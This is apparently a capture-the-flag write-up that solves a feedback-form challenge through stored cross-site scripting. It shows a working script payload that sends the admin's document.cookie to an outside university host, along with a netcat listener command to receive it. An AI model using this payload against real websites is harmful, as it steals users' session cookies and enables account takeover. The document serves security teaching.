# NGPEW Feedback Form
# Difficulty: Easy

Prompt: I found this feedback form on NGPEW's website, but I'm not convinced that their admins are actually
reading the feedback. In case they are, can you steal their cookies? I have a feeling there's something 
hidden there.

From the prompt, it seems like we need to steal the admin's cookies somehow. By using the feedback form, we
notice that the form seems to wait a few seconds, then responds with "An admin has reviewed your feedback."
In addition, the website gives us a link to see the admin view of our feedback.

Let's try putting in an HTML tag as our payload and looking at the admin view: 
`<b>test</b>`

We see that the b tag was not filtered and is shown directly to the admin. This indicates that there is a 
Cross-Site Scripting (XSS) vulnerability. 

We can leak the admin's cookies by writing some JavaScript that sends `document.cookies` to some remote 
website. For example, I can log onto `skipper.cs.utexas.edu` and run `nc -l 3000`. This opens a TCP 
listener on port 3000, which I can then send an HTTP request to, since HTTP runs on TCP. Once I have this
listener open, I can use the following payload to get JavaScript running on the admin view and leak the 
cookies to my remote server through an HTTP request:  
```<script>fetch('http://chicken-avocado-wrap.cs.utexas.edu:3000/' + document.cookie)</script>```

Finally, the flag appears in my `nc` console. 